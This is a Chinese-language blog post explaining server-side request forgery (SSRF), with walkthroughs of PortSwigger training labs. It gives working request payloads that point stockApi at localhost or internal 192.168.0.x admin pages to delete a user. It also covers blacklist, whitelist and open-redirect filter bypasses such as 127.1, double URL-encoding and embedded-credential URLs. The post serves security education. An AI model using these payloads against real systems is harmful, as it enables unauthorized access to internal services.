@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="What is SSRF？服务器端请求伪造（也称为SSRF）是一种web安全漏洞，允许攻击者诱使服务器端应用程序向非预期的地址发出请求。 在典型的SSRF攻击中，攻击者可能会导致服务器连接到目标内网中的一些服务。在某些情况下，黑客可能会使服务器连接到任意的外部系统，从而可能泄漏敏感数据，如授权凭据。 What is the impact of SSRF attacks?成功的SSRF攻击通常会导致">
+<meta property="og:type" content="article">
+<meta property="og:title" content="服务端请求伪造(SSRF)漏洞">
+<meta property="og:url" content="http://example.com/2023/10/04/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%20(SSRF)%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="踟蹰者的歌">
+<meta property="og:description" content="What is SSRF？服务器端请求伪造（也称为SSRF）是一种web安全漏洞，允许攻击者诱使服务器端应用程序向非预期的地址发出请求。 在典型的SSRF攻击中，攻击者可能会导致服务器连接到目标内网中的一些服务。在某些情况下，黑客可能会使服务器连接到任意的外部系统，从而可能泄漏敏感数据，如授权凭据。 What is the impact of SSRF attacks?成功的SSRF攻击通常会导致">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/m8VTOY54uyo3txw.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/RMkDxVifBapChZH.png">
+<meta property="article:published_time" content="2023-10-04T15:29:53.000Z">
+<meta property="article:modified_time" content="2024-01-14T11:04:04.001Z">
+<meta property="article:author" content="yu1e">
+<meta property="article:tag" content="WebSecurity">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/01/14/m8VTOY54uyo3txw.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>服务端请求伪造(SSRF)漏洞</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2023/10/04/%E5%B8%B8%E8%A7%81C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/10/04/%E6%B6%88%E6%81%AFHook/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/04/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%20(SSRF)%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/04/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%20(SSRF)%E6%BC%8F%E6%B4%9E/&text=服务端请求伪造(SSRF)漏洞"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/04/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%20(SSRF)%E6%BC%8F%E6%B4%9E/&title=服务端请求伪造(SSRF)漏洞"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/04/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%20(SSRF)%E6%BC%8F%E6%B4%9E/&is_video=false&description=服务端请求伪造(SSRF)漏洞"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=服务端请求伪造(SSRF)漏洞&body=Check out this article: http://example.com/2023/10/04/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%20(SSRF)%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/04/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%20(SSRF)%E6%BC%8F%E6%B4%9E/&title=服务端请求伪造(SSRF)漏洞"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/04/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%20(SSRF)%E6%BC%8F%E6%B4%9E/&title=服务端请求伪造(SSRF)漏洞"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/04/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%20(SSRF)%E6%BC%8F%E6%B4%9E/&title=服务端请求伪造(SSRF)漏洞"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/04/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%20(SSRF)%E6%BC%8F%E6%B4%9E/&title=服务端请求伪造(SSRF)漏洞"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/04/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%20(SSRF)%E6%BC%8F%E6%B4%9E/&name=服务端请求伪造(SSRF)漏洞&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/04/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%20(SSRF)%E6%BC%8F%E6%B4%9E/&t=服务端请求伪造(SSRF)漏洞"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#What-is-SSRF%EF%BC%9F"><span class="toc-number">1.</span> <span class="toc-text">What is SSRF？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#What-is-the-impact-of-SSRF-attacks"><span class="toc-number">2.</span> <span class="toc-text">What is the impact of SSRF attacks?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSRF-attacks-against-the-server-itself"><span class="toc-number">3.</span> <span class="toc-text">SSRF attacks against the server itself</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Example"><span class="toc-number">3.1.</span> <span class="toc-text">Example</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSRF-attacks-against-other-back-end-systems"><span class="toc-number">4.</span> <span class="toc-text">SSRF attacks against other back-end systems</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Example-1"><span class="toc-number">4.1.</span> <span class="toc-text">Example</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Circumventing-common-SSRF-defenses"><span class="toc-number">5.</span> <span class="toc-text">Circumventing common SSRF defenses</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SSRF-with-blacklist-based-input-filters"><span class="toc-number">5.1.</span> <span class="toc-text">SSRF with blacklist-based input filters</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SSRF-with-whitelist-based-input-filters"><span class="toc-number">5.2.</span> <span class="toc-text">SSRF with whitelist-based input filters</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Bypassing-SSRF-filters-via-open-redirection"><span class="toc-number">5.3.</span> <span class="toc-text">Bypassing SSRF filters via open redirection</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Example-2"><span class="toc-number">5.4.</span> <span class="toc-text">Example</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Blind-SSRF-vulnerabilities"><span class="toc-number">6.</span> <span class="toc-text">Blind SSRF vulnerabilities</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Finding-hidden-attack-surface-for-SSRF-vulnerabilities"><span class="toc-number">7.</span> <span class="toc-text">Finding hidden attack surface for SSRF vulnerabilities</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Partial-URLs-in-requests"><span class="toc-number">7.1.</span> <span class="toc-text">Partial URLs in requests</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#URLs-within-data-formats"><span class="toc-number">7.2.</span> <span class="toc-text">URLs within data formats</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SSRF-via-the-Referer-header"><span class="toc-number">7.3.</span> <span class="toc-text">SSRF via the Referer header</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        服务端请求伪造(SSRF)漏洞
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">yu1e</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-04T15:29:53.000Z" class="dt-published" itemprop="datePublished">2023-10-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/WebSecurity/" rel="tag">WebSecurity</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h4 id="What-is-SSRF？"><a href="#What-is-SSRF？" class="headerlink" title="What is SSRF？"></a>What is SSRF？</h4><p>服务器端请求伪造（也称为SSRF）是一种web安全漏洞，允许攻击者诱使服务器端应用程序向非预期的地址发出请求。</p>
+<p>在典型的SSRF攻击中，攻击者可能会导致服务器连接到目标内网中的一些服务。在某些情况下，黑客可能会使服务器连接到任意的外部系统，从而可能泄漏敏感数据，如授权凭据。</p>
+<h4 id="What-is-the-impact-of-SSRF-attacks"><a href="#What-is-the-impact-of-SSRF-attacks" class="headerlink" title="What is the impact of SSRF attacks?"></a>What is the impact of SSRF attacks?</h4><p>成功的SSRF攻击通常会导致未经授权的操作或数据访问，无论是在易受攻击的应用程序本身还是在应用程序可以与其通信的其他后端系统上。在某些情况下，SSRF漏洞可能允许攻击者执行任意命令。</p>
+<p>导致连接到外部第三方系统的SSRF漏洞可能会导致恶意的后续攻击，这些攻击似乎来自有着存在漏洞的应用程序的网络。</p>
+<h4 id="SSRF-attacks-against-the-server-itself"><a href="#SSRF-attacks-against-the-server-itself" class="headerlink" title="SSRF attacks against the server itself"></a>SSRF attacks against the server itself</h4><p>在针对服务器本身的SSRF攻击中，攻击者诱使应用程序向运行应用程序的服务器发出HTTP请求。这通常涉及提供一个URL，如127.0.0.1或localhost。</p>
+<p>例如，一个购物应用程序，该应用程序允许用户查看特定商店中的商品是否有库存。为了提供库存信息，应用程序必须查询各种后端REST API。通过前端HTTP请求将URL传递给相关的后端API端点来实现该功能，因此，当用户查看物品的库存状态时，其浏览器会发出如下请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /product/stock HTTP/1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 118</span><br><span class="line"></span><br><span class="line">stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1</span><br></pre></td></tr></table></figure>
+
+<p>这会使服务器向指定的URL发出请求，检索库存状态，并将其返回给用户。<br>在这种情况下，攻击者可以修改请求为指定服务器的本地URL。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /product/stock HTTP/1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 118</span><br><span class="line"></span><br><span class="line">stockApi=http://localhost/admin</span><br></pre></td></tr></table></figure>
+
+<p>在这里，服务器将获取&#x2F;admin URL的内容并将其返回给用户。<br>当然，攻击者可以直接访问&#x2F;admin URL。但是，管理功能通常只有经过适当身份验证的用户才能访问。因此，直接访问URL的攻击者不会看到任何内容。但是，当对&#x2F;admin URL的请求来自本地计算机本身时，将绕过正常的访问控制，应用程序将授予对管理功能的完全访问权。</p>
+<p>为什么应用程序以这种方式运行，并隐式信任来自本地计算机的请求？这可能是由于各种原因造成的：<br>访问控制检查可以在位于应用服务器前面的不同组件中实现。当连接回服务器本身时，将绕过检查。<br>出于灾难恢复目的，应用程序可能允许来自本地计算机的任何用户在不登录的情况下进行管理访问。这为管理员提供了一种在丢失凭据时恢复系统的方法。这里的假设是只有完全可信的用户将直接来自服务器本身。<br>管理接口可能正在侦听与主应用程序不同的端口号，因此用户可能无法直接访问。<br>这种信任关系通常使SSRF成为一个关键漏洞，其中来自本地机器的请求处理方式不同于普通请求。</p>
+<h5 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h5><p>环境：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://smms.app/image/m8VTOY54uyo3txw" target="_blank"><img src="https://s2.loli.net/2024/01/14/m8VTOY54uyo3txw.png" ></a></p>
+<p>请求包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">...</span><br><span class="line">stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D3%26storeId%3D2</span><br></pre></td></tr></table></figure>
+
+<p>将stockApi改成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stockApi=http%3A%2F%2Flocalhost/admin</span><br></pre></td></tr></table></figure>
+
+<p>成功绕过访问限制进入到&#x2F;adimn</p>
+<p><a href="https://smms.app/image/RMkDxVifBapChZH" target="_blank"><img src="https://s2.loli.net/2024/01/14/RMkDxVifBapChZH.png" ></a></p>
+<p>这里直接删除carlos用户删除不了，同样的方法，删除用户的URL是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0a87002d03f032cbc67ab7dc008b008c.web-security-academy.net/admin/delete?username=carlos</span><br></pre></td></tr></table></figure>
+
+<p>但是这里需要用localhost作为URL</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/admin/delete?username=carlos</span><br></pre></td></tr></table></figure>
+
+<h4 id="SSRF-attacks-against-other-back-end-systems"><a href="#SSRF-attacks-against-other-back-end-systems" class="headerlink" title="SSRF attacks against other back-end systems"></a>SSRF attacks against other back-end systems</h4><p>服务器端请求伪造通常会产生另一种类型的信任关系，即应用程序服务器能够与用户无法直接访问的其他后端系统进行交互，这些系统通常具有外网不可达的IP地址。由于内部网络的系统的安全性往往较弱，在许多情况下，内网的系统包含敏感功能，任何能够与内网系统交互的用户都可以访问这些功能，而无需进行身份验证。<br>在前面的示例中，假设后端URL有一个管理界面<a target="_blank" rel="noopener" href="https://192.168.0.68/admin%EF%BC%8C%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E6%8F%90%E4%BA%A4%E4%BB%A5%E4%B8%8B%E8%AF%B7%E6%B1%82%EF%BC%8C%E5%88%A9%E7%94%A8SSRF%E6%BC%8F%E6%B4%9E%E8%AE%BF%E9%97%AE%E7%AE%A1%E7%90%86%E7%95%8C%E9%9D%A2%EF%BC%9A">https://192.168.0.68/admin，攻击者可以通过提交以下请求，利用SSRF漏洞访问管理界面：</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /product/stock HTTP/1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 118</span><br><span class="line"></span><br><span class="line">stockApi=http://192.168.0.68/admin</span><br></pre></td></tr></table></figure>
+
+<h5 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h5><p>环境</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system</span><br></pre></td></tr></table></figure>
+
+<p>已知内网地址192.168.0.x，管理接口的端口是8080，具体地址不知道</p>
+<p>还是抓包，请求包如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">...</span><br><span class="line">stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D3%26storeId%3D1</span><br></pre></td></tr></table></figure>
+
+<p>扔到intruder模块，payload type设置为numbers</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">...</span><br><span class="line">stockApi=http://192.168.0.§1§:8080/admin</span><br></pre></td></tr></table></figure>
+
+<p>内网管理接口地址<a target="_blank" rel="noopener" href="http://192.168.0.106:8080/admin">http://192.168.0.106:8080/admin</a></p>
+<p>后面的方法和前面一样，将stockApi 改成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/delete?username=carlos</span><br></pre></td></tr></table></figure>
+
+<h4 id="Circumventing-common-SSRF-defenses"><a href="#Circumventing-common-SSRF-defenses" class="headerlink" title="Circumventing common SSRF defenses"></a>Circumventing common SSRF defenses</h4><h5 id="SSRF-with-blacklist-based-input-filters"><a href="#SSRF-with-blacklist-based-input-filters" class="headerlink" title="SSRF with blacklist-based input filters"></a>SSRF with blacklist-based input filters</h5><p>一些应用程序阻止包含主机名（如127.0.0.1和localhost）或敏感URL（如&#x2F;admin）的输入。</p>
+<ul>
+<li>使用127.0.0.1的替代IP表示，例如2130706433、017700000001或127.1。</li>
+<li>注册自己的域名，使其解析为127.0.0.1。可以使用spoofed.burpcollaborator.net来实现。</li>
+<li>使用URL编码或大小写变化来混淆被阻止的字符串。</li>
+</ul>
+<h5 id="SSRF-with-whitelist-based-input-filters"><a href="#SSRF-with-whitelist-based-input-filters" class="headerlink" title="SSRF with whitelist-based input filters"></a>SSRF with whitelist-based input filters</h5><p>有些应用程序只允许输入与白名单字符串完全匹配、开头匹配或包含白名单的值。知道白名单过滤器的这一特性后，我们就可以利用URL的规范性进行SSRF白名单过滤器绕过，但不确定性太高。如果URL解析器不支持嵌入式URL凭据，则很难奏效。</p>
+<ul>
+<li>使用@字符将凭据嵌入到主机名之前的URL中。例如：<a target="_blank" rel="noopener" href="https://expected-host@evil-host/">https:&#x2F;&#x2F;expected-host@evil-host</a></li>
+<li>使用#字符表示URL片段。例如：<a target="_blank" rel="noopener" href="https://evil-host/#expected-host">https://evil-host#expected-host</a></li>
+<li>注册域名。例如：<a target="_blank" rel="noopener" href="https://expected-host.evil-host/">https://expected-host.evil-host</a></li>
+<li>使用URL编码字符来混淆URL解析代码。</li>
+</ul>
+<h5 id="Bypassing-SSRF-filters-via-open-redirection"><a href="#Bypassing-SSRF-filters-via-open-redirection" class="headerlink" title="Bypassing SSRF filters via open redirection"></a>Bypassing SSRF filters via open redirection</h5><p>有时可以通过利用开放重定向漏洞来规避任何类型的基于过滤器的防御。</p>
+<p>在前面的SSRF示例中，假设用户提交的URL经过严格验证，以防止恶意利用SSRF行为。但是，允许其URL的应用程序包含开放重定向漏洞。如果用于使后端HTTP请求的API支持重定向，则可以构造一个满足过滤器要求的URL，并将请求重定向到所需的内网目标。</p>
+<p>例如，假设应用程序包含一个开放重定向漏洞，其中包含以下URL：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/product/nextProduct?currentProductId=6&amp;path=http://evil-user.net</span><br></pre></td></tr></table></figure>
+
+<p>返回一个定位到evil-user.net的重定向</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://evil-user.net</span><br></pre></td></tr></table></figure>
+
+<p>可以利用开放重定向漏洞绕过URL过滤器，并利用SSRF漏洞，如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /product/stock HTTP/1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 118</span><br><span class="line"></span><br><span class="line">stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin</span><br></pre></td></tr></table></figure>
+
+<p>此SSRF漏洞之所以有效，是因为应用程序首先验证所提供的stockAPI URL是否位于允许的域上。然后应用程序请求所提供的URL，从而触发重定向，并向攻击者选择的内部URL发出请求。</p>
+<h5 id="Example-2"><a href="#Example-2" class="headerlink" title="Example"></a>Example</h5><p><strong>绕过黑名单</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter</span><br></pre></td></tr></table></figure>
+
+<p>请求包将stockApi直接改成stockApi&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1/admin%E4%BC%9A%E8%A2%AB%E6%8B%A6%E6%88%AA">http://127.0.0.1/admin会被拦截</a></p>
+<p>绕过方法（将a进行两次URL编码）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stockApi=http://127.1/%2561dmin</span><br></pre></td></tr></table></figure>
+
+<p>后面的操作就和前面一样了</p>
+<p><strong>绕过白名单</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter</span><br></pre></td></tr></table></figure>
+
+<p>请求包将stockApi改成stockApi&#x3D;<a href="http://127.0.0.xn--1,"external-462sj13agl9hph5d/">http://127.0.0.1，发现返回"External</a> stock check host must be stock.weliketoshop.net”，也就是白名单校验</p>
+<p>将stockApi改为<a target="_blank" rel="noopener" href="http://username@stock.weliketoshop.net/%EF%BC%8C%E8%BF%94%E5%9B%9EInternal">http://username@stock.weliketoshop.net/，返回Internal</a> Server Error，说明URL解析器支持嵌入式凭据</p>
+<p>将stockApi改为stockApi&#x3D;<a target="_blank" rel="noopener" href="http://username/#@stock.weliketoshop.net/admin%EF%BC%8C%E8%A2%AB%E6%8B%A6%E6%88%AA">http:&#x2F;&#x2F;username#@stock.weliketoshop.net&#x2F;admin，被拦截</a></p>
+<p>将#两次url编码成为%2523，返回Internal Server Error，推测服务器可能尝试链接username</p>
+<p>最终</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用重定向绕过</strong></p>
+<p>请求包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /product/nextProduct?currentProductId=2&amp;path=/product?productId=3 HTTP/1.1</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>抓包发现服务器跳转之后请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /product?productId=3 HTTP/1.1</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>那么stockApi就能改成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin</span><br></pre></td></tr></table></figure>
+
+<h4 id="Blind-SSRF-vulnerabilities"><a href="#Blind-SSRF-vulnerabilities" class="headerlink" title="Blind SSRF vulnerabilities"></a>Blind SSRF vulnerabilities</h4><p>当应用程序被诱导向某个URL发出后端HTTP请求，但请求的响应未在应用程序的前端响应中返回时（也就是不能看见返回给客户端的内容），就会出现Blind SSRF漏洞。</p>
+<h4 id="Finding-hidden-attack-surface-for-SSRF-vulnerabilities"><a href="#Finding-hidden-attack-surface-for-SSRF-vulnerabilities" class="headerlink" title="Finding hidden attack surface for SSRF vulnerabilities"></a>Finding hidden attack surface for SSRF vulnerabilities</h4><p>许多服务器端请求伪造漏洞相对容易发现，因为应用程序的正常流量涉及包含完整URL的请求参数。</p>
+<h5 id="Partial-URLs-in-requests"><a href="#Partial-URLs-in-requests" class="headerlink" title="Partial URLs in requests"></a>Partial URLs in requests</h5><p>有时，应用程序只将主机名或URL路径的一部分放入请求参数中。然后将提交的值合并到服务器端请求的完整URL中。如果该值很容易被识别为主机名或URL路径，那么潜在的攻击表面可能很明显。然而，作为完整SSRF的可利用性可能受到限制，因为无法控制请求的整个URL。</p>
